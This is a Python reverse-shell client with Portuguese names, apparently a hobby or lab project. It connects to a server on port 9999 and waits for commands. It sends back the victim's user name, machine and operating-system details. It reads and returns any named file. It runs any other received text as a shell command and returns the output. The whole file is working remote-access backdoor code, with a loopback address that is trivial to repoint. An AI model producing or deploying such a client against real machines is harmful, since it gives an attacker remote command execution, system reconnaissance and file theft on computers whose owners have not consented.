import os
import socket
import platform
import subprocess

os.system('title Cliente')

def criar_socket():
    clientsocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    criar_conection(clientsocket)

def criar_conection(clientsocket):
    try:
        clientsocket.connect(('127.0.0.1',9999))
    except ConnectionRefusedError:
        print("Timeout ):")
    else:
        print("[!] Conetado (:")
        comandos(clientsocket)

def comandos(clientsocket):
    while True:
        message = clientsocket.recv(1024).decode('utf-8')

        if 'sair' in message:
            print("A Encerrar...")
            clientsocket.close()
            break
        elif 'limpar' in message:
            os.system('cls')
        elif 'infocliente' in message:
            utilizador=str(os.getlogin())
            nome_pc=str(platform.node())
            sistema=str(platform.system())
            os_ver=str(platform.release())
            os_full_ver=str(platform.platform())
            arquitetura=str(platform.architecture())
            maquina=str(platform.machine())
            cpu=str(platform.processor())
            cpu_num=str(os.cpu_count())
            info=("\nUtilizador: "+utilizador+"\nNome do PC: "+nome_pc+"\nSistema Operativo: "+sistema+" "+os_ver+"\nOS Versao: "+os_full_ver+"\nArquitetura: "+arquitetura+"\nMaquina: "+maquina+"\nProcessador: "+cpu+" "+cpu_num+" Cores")
            clientsocket.send(str.encode(info))
        elif 'chdir' in message:
            try:
                pasta=message[6:]
                os.chdir(pasta)
            except FileNotFoundError:
                clientsocket.send(str.encode("Diretorio Nao Encontrado"))
            else:
                clientsocket.send(str.encode("Diretorio> "+os.system('CD')))

        elif 'file' in message:
            f_nome=message[5:]
            try:
                f=open(f_nome,"r")
            except FileNotFoundError:
                clientsocket.send(str.encode("Ficheiro Nao Encontrado"))
            else:
                f_data=f.read()
                f.close()
                clientsocket.send(str.encode(f_data))
        else:
            cmds = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            msgout = cmds.stdout.read() + cmds.stderr.read()
            msgstr = str(msgout, 'latin-1')

            clientsocket.send(str.encode(msgstr + '\n'))
            print(msgstr)

def main():
    criar_socket()

main()
